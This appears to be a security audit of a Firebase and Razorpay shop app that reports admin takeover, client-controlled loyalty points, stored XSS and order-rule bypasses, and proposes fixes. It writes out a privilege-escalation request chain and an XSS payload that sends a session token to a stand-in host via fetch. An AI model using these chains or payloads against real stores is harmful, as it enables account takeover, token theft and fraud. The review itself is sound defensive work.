# Mytholis — Pre-Launch Security & Correctness Review

**Reviewed:** 2026-11-02
**Source ref:** `3e8131f` (branch `main`), worktree **dirty** — 18 modified files not committed
**Scope:** `functions/`, `firestore.rules`, `js/`, `index.html`, `vite.config.js`, `firebase.json`, `capacitor.config.json`, `android/`, `.env.example`
**Method:** Source review only. No production endpoint was contacted, no live data was read, no exploit was executed. Every finding below is traced to specific source lines. Items that depend on Firebase/Razorpay console settings are marked **NEEDS YOUR ACCESS**.

---

## 0. Verdict

**Do not go live in the current state.**

There are **5 critical** issues that are reachable by any anonymous or normally-registered user, without any special tooling. Three of them lead to full administrative takeover of the store, one leads to unlimited free inventory, and one destroys customer records.

The root cause is one architectural decision repeated in several places: **the client is treated as the source of truth for money, loyalty, identity and authorization.** `AGENTS.md` says the right thing; the implementation does not yet follow it.

Estimated remediation: the critical set is ~2–3 days of focused work; the high set another ~3–4 days. The rest can ship after.

---

## 1. Critical

### C1 — Any registered user can make themselves a full administrator (2 requests)

**Where**

| File | Lines | What |
|---|---|---|
| `firestore.rules` | 21–26 | `create`/`update` on `/users/{uid}` only guard the **top-level** `role` and `isAdmin` keys. Nested `profile.role`, `profile.isAdmin`, `emailCanonical`, `phoneCanonical`, `linkedUids` are all client-writable. |
| `functions/handlers/patron/reconcile.js` | 214–215, 240, 258–260, 316–317, 327–334 | Trusts `profile.role`/`profile.isAdmin` as evidence of admin when scoring and consolidating records, then writes a **top-level** `role: 'admin'` / `isAdmin: true` onto the master document. |
| `functions/handlers/admin.js` | 94–104 | `u.role === 'admin'` on the user doc ⇒ full admin API. |
| `firestore.rules` | 5–16 | `isAdmin()` returns true for `users/{uid}.role == 'admin'`. |

**Chain**

1. `setDoc(users/{myUid}, { profile: { role: 'admin' }, emailCanonical: '<any other user\'s email>' }, { merge: true })` — allowed by the rules (only `role`/`isAdmin` at the root are protected).
2. `POST /api/patron/reconcile` with your own bearer token. The handler now sees two candidate documents, scores yours at +10,000,000 for `profile.role === 'admin'` (line 214), picks you as `masterUid`, and writes `role: 'admin', isAdmin: true` to your own user document (lines 316–317, 327–334).

From that point `firestore.rules`' `isAdmin()` is true (read every order and user), `/api/admin` is open (all dashboard actions, arbitrary loyalty adjustment, order status forgery, voucher minting), and `/api/patron/delete-account` / `/api/patron/batch-deduplicate` are unlocked.

**Fix (smallest effective)**
- Rules: on `/users/{uid}` self-write, compare the **whole document** against a strict allowlist — permit only `name`, `phone`, `address`, `pincode`, `city`, `state`, `photoURL`, `signup_bonus_popup_seen`, `updatedAt`, `emailCanonical` (derived, or drop and compute server-side). Reject if any other key changed: `request.resource.data.diff(resource.data).affectedKeys().hasOnly([...])`.
- Never store or read authorization state from a client-writable document. Set a custom claim with the Admin SDK (`admin: true`) and check `request.auth.token.admin === true` / `decodedToken.admin === true` everywhere.
- `reconcile.js`: delete the `profile.role` / `profile.isAdmin` branches entirely (lines 214, 240, 258–260) and never write authorization fields from a merge.

---

### C2 — Loyalty currency is fully client-authoritative ⇒ unlimited free vouchers

**Where**

| File | Lines | What |
|---|---|---|
| `firestore.rules` | 24–26 | A user may update **any** field of their own document except `role`/`isAdmin` — including `loyalty.spendable_mythos`, `loyalty.legacy_mythos`, `loyalty.active_reward_codes`, `loyalty.manual_tier_override`. |
| `firestore.rules` | 21–23 | Same on create — a brand-new account can be created with 999,999 points. |
| `js/firebase.js` | 1412–1416 | `pushLocalStateToCloud()` writes the entire local `loyalty` object back to Firestore with `merge: true`. |
| `js/store.js` | 872–914 | `redeemMythosReward()` mints the voucher **in the browser**, deducts points locally, and writes it into `active_reward_codes`. There is no server call. |
| `functions/index.js` | 112 | `/api/redeem-reward` is registered but **never called by any client code** (verified by search — the only reference is its own handler). |

**Impact**
Any account can set its own balance, mint unlimited `₹200`–`₹2,500` concession codes and a Level-5 `manual_tier_override`, then persist it. Every one of those is real money.

**Fix**
- Rules: make `loyalty`, `points`, `tier`, `role`, `isAdmin`, `active_reward_codes`, `manual_tier_override` **non-client-writable** (`!diff.affectedKeys().hasAny([...])`).
- Route redemption through `/api/redeem-reward`, wrapped in `adminDb.runTransaction` (see C5/M2), and have the client re-read the document afterwards instead of writing it.
- Award points only from server code, ideally with an idempotency key per order (`rewardsCredited` guard is already half-built in `dispatch.js:197`).

---

### C3 — Stored XSS in the admin dashboard ⇒ admin session takeover

**Where**

| File | Lines | What |
|---|---|---|
| `js/adminComponents.js` | 581–585 | `${patronName}`, `${patronEmail}`, `${patronPhone}`, `${shippingAddr}` interpolated raw into `innerHTML`. |
| `js/adminComponents.js` | 2164–2166 | `${ordId}`, `${ordStatus}`, `${ordPay}` raw. |
| `js/adminComponents.js` | 2173 | `${it.name}` raw inside `items.map(...)`. |
| `js/adminComponents.js` | 2181, 1350, 1355 | `${ordId}` / `${pc.code}` inside a **single-quoted JS string inside an onclick attribute** — this is script injection, not just markup injection. |
| `firestore.rules` | 39–43 | Any authenticated user can create an order document with arbitrary `items`, `status`, `orderId`. |
| `js/firebase.js` | 1427–1434 | The client itself creates order documents with items taken from `localStorage`. |

**Impact**
An attacker writes an order (or edits their own profile name) containing `');fetch('https://x/'+btoa(...));//` or an `<img onerror>` payload. The founder opens the dashboard; the script runs **on the admin origin**, calls `auth.currentUser.getIdToken()` and exfiltrates it, or simply drives `/api/admin` directly with the victim's own session. Result: full store takeover.

There is no `escapeHtml()` helper anywhere in `js/` (verified by search), so this is systemic, not one bad line.

**Fix**
- Add one `esc()` / `escapeAttr()` helper and use it on **every** interpolation of a document field.
- Replace inline `onclick="fn('${id}')"` with `data-id` + delegated `addEventListener`. This removes the JS-string-in-attribute class entirely.
- Better: build admin rows with `document.createElement` + `textContent`.

---

### C4 — `/api/patron/reconcile` lets any user merge and delete another user's account

**Where** `functions/handlers/patron/reconcile.js`

| Lines | What |
|---|---|
| 47, 55 | `bodyEmail` / `bodyPhone` from the **request body** are used as the search identity. No proof the caller owns them and no comparison against the verified token. |
| 92–154 | Looks up other users by phone, email, `linkedUids`. |
| 252–280 | Sums the duplicate's `spendable_mythos`, `legacy_mythos`, bottles and reward codes into the master. |
| 337–371 | Reassigns every order of the duplicate to the master, then **archives and deletes** `users/{duplicateUid}`. |

Called automatically on login (`js/firebase.js:567`, `:634`) and directly reachable.

**Impact**
- Cross-tenant write: absorb a victim's order history and loyalty into an account you control.
- Denial of service / record destruction: `users/{targetUid}` is deleted for any email or phone you know.
- Combined with C1 this is also the pivot that grants admin.

**Fix**
- Derive identity exclusively from the verified token: `decodedToken.email` **only if `decodedToken.email_verified === true`**, and `decodedToken.phone_number` (already verified by Firebase).
- Remove `bodyEmail` / `bodyPhone` entirely, or require a second verification step (OTP to that address/number) before merging.
- Never `delete()` a user document in a merge path — mark `isMergedDuplicate` and keep the record.

---

### C5 — The `orders` rule can be bypassed with a capital letter ⇒ fabricated "paid" orders

**Where** `firestore.rules:39–43`

```
allow create: if isAdmin() || (
  request.auth != null &&
  request.resource.data.userId == request.auth.uid &&
  request.resource.data.get('paymentStatus', 'Pending') != 'Paid'
);
```

`'PAID'`, `'Paid '`, `'paid'`, `'Paid2'` all pass the `!= 'Paid'` check. Nothing constrains `total`, `verifiedTotal`, `items`, `status` or `rewardsCredited` either.

**Impact**
An authenticated user can create an order document that says `paymentStatus: 'PAID'`, `status: 'CONFIRMED'`, `total: 1`, with any items they like and any customer name. It appears in the admin dashboard looking exactly like a real paid order, is eligible for label printing (`app.printShippingLabelForOrder`), and never touches Razorpay. That is direct goods theft if fulfilment trusts the dashboard.

**Fix**
- Create rule: `request.resource.data.keys().hasOnly([...customer-facing fields...])` and force `paymentStatus == 'PENDING'`, `status == 'CREATED'`, and `verifiedTotal` to be absent.
- Better: stop letting clients create orders at all. Write them only from `/api/create-order` (Admin SDK bypasses rules) and set `allow create: if false`.

---

## 2. High

### H1 — Voucher/reward-code vault is publicly listable and infinitely reusable
- `firestore.rules:58–65` — `allow read: if true` on `/reward_codes/{code}` **and** `/vouchers/{voucherId}`. In Firestore, collection-level `read` permits `getDocs()`. With the public web API key (shipped in every bundle) anyone can dump every code, including unused VIP codes and targeted ones.
- `functions/catalog.js:459–474` looks up the voucher but **never enforces `targetEmail`**, never checks `maxUses`/`usesCount`, and **never marks it used**. `used: true` is only ever set client-side (`js/store.js:853`).
- `functions/handlers/admin.js:287–315` writes `targetEmail` and `maxUses` that nothing honours.

**Fix:** make the vault read-by-exact-ID only (rules cannot express "get but not list" directly — use a random unguessable document ID and `allow get: if true; allow list: if false`), enforce `targetEmail` against the verified token, and mark usage inside the payment transaction.

### H2 — Order history disclosure via an unverified email claim
`firestore.rules:44` — `resource.data.userEmail == request.auth.token.email`. Firebase does **not** verify email ownership at signup. An attacker registers `victim@gmail.com` with a password, then queries `orders` where `userEmail == that address` and reads order contents, phone and delivery address. No `email_verified` check exists anywhere in the codebase (rules, `admin.js`, `delete-account.js`).

**Fix:** require `request.auth.token.email_verified == true` in the rule, and enable email verification in the Auth flow.

### H3 — Redeemed points are never debited
`functions/catalog.js:506–516` computes `mythosDiscount` from a client-supplied `pointsClaimed` count, capped at 30% / ₹2,500. No code path anywhere subtracts those points from `loyalty.spendable_mythos` — `verify-payment.js:120–127` only **adds**. A user can apply the maximum concession on every order forever, with a zero balance.

**Fix:** in the payment transaction, read the balance server-side, clamp the discount to it, and decrement atomically.

### H4 — Payment confirmation has no webhook and swallows its own failure
`functions/handlers/razorpay/verify-payment.js`
- 78–91: if the order draft does not exist, the transaction returns `{exists:false}` and the handler still replies `200 success: true`.
- 174–181: a transaction exception is caught and only `console.warn`ed — then line 183 returns `success: true`.
- No check that Razorpay actually **captured** the amount, and no amount comparison.
- There is **no Razorpay webhook handler in the repo at all**. If the buyer closes the tab after paying, the payment is captured and the order stays `PENDING` forever, with no reconciliation job.

**Fix:** add `/api/razorpay/webhook` with HMAC verification against `RAZORPAY_WEBHOOK_SECRET`, use it as the authoritative settlement path, and make `verify-payment` return non-200 on any DB failure.

### H5 — One purchase creates 2–3 order documents and credits loyalty 2–4 times
- `js/app.js:2912` → `recordOrderInCloud()` does `addDoc(orders, …)` with a **client-computed** `total`.
- `js/app.js:2925` → `/api/complete-order` creates a *second* document keyed by the Razorpay order id.
- `functions/handlers/razorpay/create-order.js:245` already wrote a third draft.
- Loyalty is credited in `js/app.js:2858` (client), `js/firebase.js:2380` (client admin path), `functions/handlers/dispatch.js:228` (COD delivery) and `verify-payment.js:120` — four independent writers with no shared idempotency key.

**Impact:** duplicate consignments in the dashboard (double shipping), inflated points, and an unreconcilable ledger.

**Fix:** one order document, created and owned by the server; delete `recordOrderInCloud`; single `settleOrder(orderId)` function guarded by a transaction on `rewardsCredited`.

### H6 — `FIRST20` (20% off, up to ₹10,000) is effectively a permanent public discount
`functions/catalog.js:136–144` registers it as a permanent code. `js/app.js:2156–2158` and `2581–2583` auto-apply it whenever the local `user.orders` array is empty — which is true for every guest, every new account, and anyone who clears `localStorage`. The server applies it unconditionally, with `maxDiscount: 10000`.

**Fix:** make first-order eligibility a server-side check against the order history, or remove the code.

### H7 — The amount charged does not equal the amount shown
`js/app.js:2233–2252` (`updateCheckoutModalPrice`) computes `baseSubtotal − discount − upiDiscount` and omits:
- `shippingFee` (₹150 when the cart is under ₹3,000 — `functions/catalog.js:519–528`)
- `codFee` (`catalog.js:563`)
- and caps discounts at 30% / ₹2,500 (`js/store.js:1060–1063`) while the server caps at `maxDiscount` (up to ₹10,000).

Additionally, client-only vouchers — personal reward codes, `MYTH-COFFRET-1000`, and any `MYTH-…` code (`js/store.js:956–970` accepts *any* `MYTH-` prefix as ₹500 off) — are shown as discounts but are **not** recognised by `calculateServerOrderTotal`, which only reads `vouchers/`, `reward_codes/` and the hardcoded table.

**Impact:** the Razorpay sheet opens with a higher amount than the customer just approved. That is both a chargeback generator and, in India, a consumer-protection problem.

**Fix:** display `orderData.verifiedTotal` from `/api/create-order` as the single source of truth; delete the parallel client calculator.

### H8 — `/api/complete-order` is unauthenticated and can touch any order by id
`functions/handlers/complete-order.js:19–59` accepts `orderId` from the body with no auth requirement; if a draft exists it updates `placedAt`/`status`/`paymentStatus` on **that** document regardless of owner. Lines 182–186 then `set(…, {merge:true})` on a client-chosen document id.

**Fix:** require a bearer token, verify the draft's `userId` matches, and reject unknown ids.

### H9 — The Android artifacts are pre-migration and cannot complete a checkout

Three different generations of the web app are committed side by side:

| Artifact | Built | Checkout code inside |
|---|---|---|
| `Mytholis.apk` (22 MB, repo root) | 24 Oct | **legacy Fastrr** — calls `/api/fastrr/create-checkout`, an endpoint that no longer exists. No Razorpay code at all. |
| `android/app/src/main/assets/public/assets/*.js` | 30 Oct | neither Fastrr nor Razorpay — `create-order`/`verify-payment` appear **zero** times |
| `dist/assets/index-Cz7Z2usV.js` | 2 Nov | current Razorpay flow (`create-order` ×2, `verify-payment` ×1) |

So the APK in the repository is ~9 days stale, predates the Razorpay migration **and** every fail-closed fix documented in `AGENTS.md`, and its payment button calls a dead endpoint. `capacitor.config.json` inside the APK is fine (`allowMixedContent: false`), and I confirmed no Razorpay secret is baked into it — but installing it today produces a broken checkout.

Also: `android/app/build.gradle` has **no `signingConfig`**, so release builds are unsigned unless signed manually, and the committed APK is almost certainly debug-signed.

**Fix:** delete both committed artifacts, add them to `.gitignore` (`dist/` is already ignored — the Android asset copy is not), build through `npm run android:sync`, and sign releases with a Play App Signing key held outside the repo.

### H10 — Admin identity is a hardcoded email list duplicated six times, with a substring bug
Copies: `firestore.rules:10`, `functions/handlers/admin.js:59–63`, `functions/handlers/patron/delete-account.js:43–47`, `functions/handlers/patron/batch-deduplicate.js:45–49`, `js/firebase.js:58–63`, plus `ADMIN_EMAIL` env.

`delete-account.js:57` and `batch-deduplicate.js:62` use `callerEmail.includes('gunhegarr')`. **`gunhegarr@evil.com` is treated as the founder** by both endpoints.

**Fix:** one helper, exact match only, claims-based; delete the other five copies.

---

## 3. Medium

| # | Issue | Evidence |
|---|---|---|
| M1 | `/api/create-order` accepts a raw `amount` in paise when `items` is absent, so the "authoritative" draft total can be client-chosen | `create-order.js:132–138` |
| M2 | `/api/redeem-reward` is dead code **and** non-atomic: read-modify-write outside a transaction (double-spend), 9,000-combination code with no collision check | `redeem-reward.js:50–79`, `:63` |
| M3 | `/api/health` is unauthenticated, writes to Firestore and calls `adminAuth.listUsers(1)` on every hit; the `adminDb ? …` checks are meaningless because it is a Proxy (always truthy) | `health.js:19–35` |
| M4 | CORS: Express sets `origin: true, credentials: true`, then each handler overwrites it with `Access-Control-Allow-Origin: *` **and** `Allow-Credentials: true` — an invalid combination, and any origin may call every money endpoint with a stolen token | `index.js:76`, `admin.js:26–29` and all handlers |
| M5 | `router.all()` exposes every endpoint to `GET`; `Object.assign(req.query, req.params)` lets query params shadow path params | `index.js:97–130` |
| M6 | No rate limiting, no App Check, no bot protection. Each `/api/create-order` call creates a real Razorpay order; codes are 4–6 characters | global |
| M7 | Dispatch webhook uses a static token compared with `!==` (not timing-safe), no HMAC, no replay window, accepts an `Authorization` header, and logs the full payload (PII) | `dispatch.js:59–73` |
| M8 | `batch-deduplicate` loads **every** user and **every** order into memory and issues unbounded writes inside a 60 s / 512 MiB function — guaranteed timeout at scale, and it merges accounts permanently with no dry-run | `batch-deduplicate.js:92–99`, `index.js:139–145` |
| M9 | `GET_DASHBOARD_DATA` returns up to 500 full user documents (addresses, phones) and 100 orders with no pagination or audit trail | `admin.js:115–201` |
| M10 | Admin actions are not audit-logged (who changed which order/balance, when) | throughout |
| M11 | `delete-account` permanently deletes paid orders and invoices on customer request — conflicts with the GST retention promise made in `public/deletion.html:150` | `delete-account.js:102–155` |
| M12 | Android `android:allowBackup="true"` with no `dataExtractionRules` — WebView storage (session, cart, PII) is eligible for cloud backup | `AndroidManifest.xml:6` |
| M13 | No CSP, no HSTS, no `Permissions-Policy`; `X-XSS-Protection: 1; mode=block` is deprecated and can introduce issues in old engines; `checkout.js` is loaded with no SRI | `firebase.json:22–48`, `index.html:381` |
| M14 | Meta Pixel is injected as soon as an ID is configured, with no consent gate — a DPDP Act / GDPR problem given the privacy policy's language | `js/app.js:4315–4334` |
| M15 | Missing **Refund/Cancellation** and **Shipping** policy pages, mandatory for Indian e-commerce | `public/` has only privacy, terms, deletion |
| M16 | `npm audit`: 5 high + 9 moderate advisories, notably `@grpc/grpc-js` (unauthorized-certificate acceptance) and `re2js` (ReDoS). Mostly transitive; pin/upgrade | both `package.json`s |
| M17 | `functions/package.json` declares `firebase-admin ^13.0.0` while the root declares `^14.5.0` and `node_modules` has 14.5.0 — deploy installs 13.x, tests run 14.x. `razorpay` SDK is declared but never imported | `functions/package.json:19–21` |
| M18 | `.env.example` Firebase values do not match the fallbacks in `js/firebase.js` (sender id `850604239849` vs `227633160778`, different `appId` and `measurementId`) — copying the example silently breaks analytics/auth | `.env.example:13–15` vs `js/firebase.js:88–90` |
| M19 | Tier names drift: `js/store.js:22` says "Level 1: The Observer", `functions/handlers/admin.js:5` says "Level 1: The Initiate" — the same user shows different tiers in profile vs admin | both |
| M20 | `utils/normalize.js` and `functions/utils/normalize.js` are duplicated (byte-identical today); `js/catalog.js` and `functions/catalog.js` are two independent price tables kept in sync by hand — I diffed them and **prices currently agree for all six products and the coffret**, so this is a drift risk, not a present mismatch | repo |
| M21 | No tests, no lint config, no CI. `firestore.rules` is edited by hand and deployed with `--force` | repo |
| M22 | Committed build artifacts: `Mytholis.apk` and a duplicate of `dist/` under `android/app/src/main/assets/public/` that drifts from source (see H9) | repo |

---

## 4. Low / Informational

- Live Razorpay **secret key** sits in plaintext in `.env` and `functions/.env`. I verified both are git-ignored and **absent from git history** (`git log -S` finds nothing) — so this is not a leak today. Rotate it anyway if either file was ever copied, screen-shared, or backed up somewhere else. The root `.env` does not need the secret at all (only `VITE_*` is read by Vite).
- Firebase Web API key is hardcoded as a fallback in `js/firebase.js:84` and in `.env.example:9`. Web API keys are public by design, but the fallback defeats the "fail closed if unconfigured" intent, and without App Check the key is directly usable to enumerate Firestore.
- `showToast()` writes `message` via `innerHTML` (`js/app.js:3494`) and callers pass raw server error strings such as `` Unknown catalog product: ${item.id} `` — reflected DOM XSS, currently self-inflicted only.
- PII (name, phone, address) is written to `console.log` in `dispatch.js:73` and `reconcile.js:233`; Firebase retains function logs.
- `labelRebrander.js:104` uses the client-supplied `item.price` as the declared shipment/customs value.
- `js/firebase.js:1932`–style fallbacks quietly swallow Firestore permission errors (`.catch(() => {})` appears ~40 times), which will hide the breakage that the C1/C2 fixes will cause.
- Working tree is dirty (18 modified files) — the reviewed state is not reproducible from `main`. Commit before deploying anything.

---

## 5. What I need from you

Ordered by how much it constrains the recommendations. The first four are genuine blockers for a go/no-go call.

**A. Firebase console (or screenshots) — NEEDS YOUR ACCESS**
1. **Auth providers enabled**, and whether *Email enumeration protection* is on.
2. Are `admin@mytholis.com` and `founder@mytholis.com` real registered accounts, or only names in the allowlist? (If they are unregistered, anyone can sign up as them — no verification is required by the current code.)
3. Is **email verification** enforced before sign-in? Does any admin account use MFA?
4. **Authorized domains** list, and whether the custom auth domain `mytholis.com` is registered with `/__/auth/handler` on Google and Meta.
5. Are the rules in `firestore.rules` actually the **deployed** rules? (The repo file and the live ruleset must be compared — I could only read the repo.)
6. Is Firestore in **production mode**, with App Check enforced or available to enable?
7. Firestore **usage/backups**: is there a scheduled export? This matters because several fixes require migrating existing `users` and `orders` documents.

**B. Razorpay dashboard — NEEDS YOUR ACCESS**
8. Are **webhooks** configured at all, and if so at what URL/secret? (No webhook handler exists in the code.)
9. Payment **capture** setting: auto-capture or manual? `verify-payment` never checks capture status.
10. Is the live key currently in use the same `rzp_live_…` as in `.env`? Has it ever been rotated?
11. Refund policy in practice — the code has no refund workflow at all.

**C. Deployment / secrets**
12. Exact environment variables set on the deployed `api` function: `RAZORPAY_KEY_ID`, `RAZORPAY_KEY_SECRET`, `ADMIN_EMAIL`, `DISPATCH_WEBHOOK_SECRET`, `ADMIN_API_KEY`, `FIREBASE_SERVICE_ACCOUNT`. Which are actually populated? (Any empty one changes the risk profile — e.g. an unset `DISPATCH_WEBHOOK_SECRET` fails closed, which is correct; an unset `ADMIN_API_KEY` just disables the header fallback.)
13. Is there a **staging** Firebase project I can verify fixes against? I will not test against production.
14. Is the APK distributed via Play Store or a direct download? If Play: keystore/Play App Signing status, current `versionCode` (code says 2), Data Safety form contents. If direct: how is it signed?

**D. Business decisions I should not guess**
15. **`FIRST20`** — intended as a genuine first-order-only code, or a permanent 20% promo? Who is eligible?
16. **Loyalty economics** — the client and server disagree on almost every number (tier names, threshold semantics, reward `minOrder`, whether gifts like `FREE_50ML` ship an actual bottle). I need the intended rule table signed off.
17. **Vouchers** — should a code be single-use globally, once per customer, or unlimited until an expiry date? Are targeted `targetEmail` codes meant to be locked to that email?
18. **COD** — is fulfilment allowed to ship on `paymentStatus: 'COD Pending'`? If yes, what is the fraud ceiling?
19. **Order lifecycle** — who moves an order to `CONFIRMED`/`SHIPPED`? Only the admin dashboard, or does a courier webhook? This determines whether the fabricated-paid-order issue (C5) is theft or just noise.
20. **Data retention** — how long must order/invoice records be kept? `delete-account` currently destroys them immediately, which contradicts the GST note in `deletion.html`.

**E. Nice to have**
21. Any crash reports / support complaints already received (would confirm which of H5/H7 users are already hitting).
22. Brand assets for the missing Refund and Shipping policy pages, and your GST/legal entity details if they differ from what is in `terms.html`.
23. Whether the `android/app/src/main/assets/public/` copy is generated by `npm run android:sync` in CI or committed by hand.

---

## 6. Suggested order of work

**Before anything else (same day)**
1. Rotate the Razorpay live key secret, and confirm `.env` / `functions/.env` are not in any backup or chat history.
2. Tighten `firestore.rules` for `/users/{uid}` to an allowlist (kills C1, C2 and the delete-account bypass in one edit).
3. Delete the `profile.role` / `includes('gunhegarr')` branches in `reconcile.js`, `delete-account.js`, `batch-deduplicate.js`; replace with `decodedToken.admin === true`.
4. Remove `bodyEmail`/`bodyPhone` from `reconcile.js` (C4).
5. Set `allow create: if false` on `/orders` and stop the client writing orders (C5, H5).

**Before launch (this week)**
6. Add `esc()` and fix every interpolation in `adminComponents.js`; replace inline `onclick` handlers (C3).
7. Make loyalty server-only: transactional `/api/redeem-reward`, server-side debit on order, delete `pushLocalStateToCloud`'s loyalty write (C2, H3).
8. Add the Razorpay webhook, make `verify-payment` fail loudly (H4).
9. Enforce voucher `targetEmail` / `maxUses` / used-once in the payment transaction; stop listing the vault (H1).
10. Require `email_verified` in the orders read rule (H2).
11. Rebuild the Android app from current source (`npm run android:sync`) or remove the stale artifacts; do not publish `Mytholis.apk` (H9).

**Then**
11. Rate limiting + App Check; CORS allowlist; `router.all` → explicit methods.
12. Security headers + CSP; drop `X-XSS-Protection`.
13. Consent-gated analytics; refund/shipping pages; `allowBackup` + `dataExtractionRules`.
14. Tests for pricing (one table, server only), rules unit tests with the emulator, and a CI step that runs `firebase deploy --only firestore:rules` only after `firebase emulators:exec` passes.

---

## 7. Coverage statement

This was a **standard-depth, whole-repository source review** by a single reviewer plus two focused sweeps. Everything under `functions/`, `firestore.rules`, `js/`, the hosting config, and the Android manifest/gradle was read. Not covered:

- The compiled bundles in `dist/` and `android/app/src/main/assets/public/` were only grepped for secrets, not audited.
- `js/app.js` (~6,200 lines), `js/components.js` (~4,000) and `js/adminComponents.js` (~2,300) were reviewed by targeted search for dangerous sinks and money/loyalty paths, not line-by-line — a full read may surface more of the C3 family.
- No dynamic testing, no emulator run, no dependency-source review.
- Console-side configuration (Auth providers, App Check, App Check enforcement, Razorpay webhooks, Play signing) is invisible from the repository — those are the items in section 5.

A single pass does not exhaust a codebase; treat this as the starting coverage ledger, not a clearance certificate.
